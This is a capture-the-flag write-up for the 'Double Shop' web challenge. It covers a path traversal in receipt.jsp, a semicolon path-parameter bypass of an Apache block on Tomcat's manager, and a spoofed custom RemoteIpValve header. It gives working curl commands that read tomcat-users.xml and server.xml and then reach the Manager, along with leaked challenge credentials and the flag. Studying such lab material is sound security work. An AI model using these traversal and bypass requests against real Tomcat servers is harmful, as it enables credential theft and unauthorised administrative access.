# Double Shop

## Challenge Info
- **CTF**: srdnlenIT2026
- **Category**: web
- **URL**: http://doubleshop.challs.srdnlen.it
- **Description**: Kety & Tom's vending system. Reach the Manager.

## Architecture
- **Frontend**: Apache/2.4.58 (reverse proxy)
- **Backend**: Apache Tomcat/9.0.65 (JSP application)
- Apache proxies `/api/` to Tomcat on port 8080
- Apache blocks direct access to `/api/manager/` (403 Forbidden)

## Vulnerabilities

### 1. Path Traversal in receipt.jsp
`/api/receipt.jsp?id=` parameter is vulnerable to directory traversal.
The base directory is `webapps/ROOT/receipts/`, and `../../` reaches `CATALINA_HOME/`.

### 2. Tomcat Semicolon Path Parameter Bypass
Apache blocks `/api/manager/` but NOT `/api/manager;/html`.
Tomcat treats `;` as a path parameter separator, so `manager;` resolves to the `manager` application.

### 3. Custom RemoteIpValve Header
In `server.xml`, a `RemoteIpValve` is configured with a **non-standard** remote IP header:
```xml
<Valve className="org.apache.catalina.valves.RemoteIpValve"
       internalProxies=".*"
       remoteIpHeader="X-Access-Manager"
       proxiesHeader="X-Forwarded-By"
       protocolHeader="X-Forwarded-Proto" />
```
By sending `X-Access-Manager: 127.0.0.1`, Tomcat believes the request comes from localhost.

## Exploitation Steps

### Step 1: Leak Tomcat credentials via path traversal
```bash
curl "http://doubleshop.challs.srdnlen.it/api/receipt.jsp?id=../../conf/tomcat-users.xml"
```
Reveals: `username="adm1n" password="317014774e3e85626bd2fa9c5046142c" roles="manager-gui"`

### Step 2: Leak server.xml to find the custom header
```bash
curl "http://doubleshop.challs.srdnlen.it/api/receipt.jsp?id=../../conf/server.xml"
```
Reveals: `remoteIpHeader="X-Access-Manager"` (non-standard header name)

### Step 3: Access Tomcat Manager combining all bypasses
```bash
curl -u "adm1n:317014774e3e85626bd2fa9c5046142c" \
  -H "X-Access-Manager: 127.0.0.1" \
  "http://doubleshop.challs.srdnlen.it/api/manager;/html"
```

### Step 4: Read the flag
The flag is visible as a deployed Tomcat application in the Manager dashboard:
`/srdnlen{d0uble_m1sC0nf_aR3_n0t_fUn}`

## Flag
`srdnlen{d0uble_m1sC0nf_aR3_n0t_fUn}`

## Key Takeaways
- Semicolon path parameters bypass Apache URL pattern matching but reach Tomcat
- Always check `server.xml` for non-standard header configurations in RemoteIpValve
- Path traversal in file-reading endpoints can leak sensitive Tomcat configuration files
- "Double" theme: double proxy layer (Apache → Tomcat) + double misconfiguration (path traversal + header spoofing)
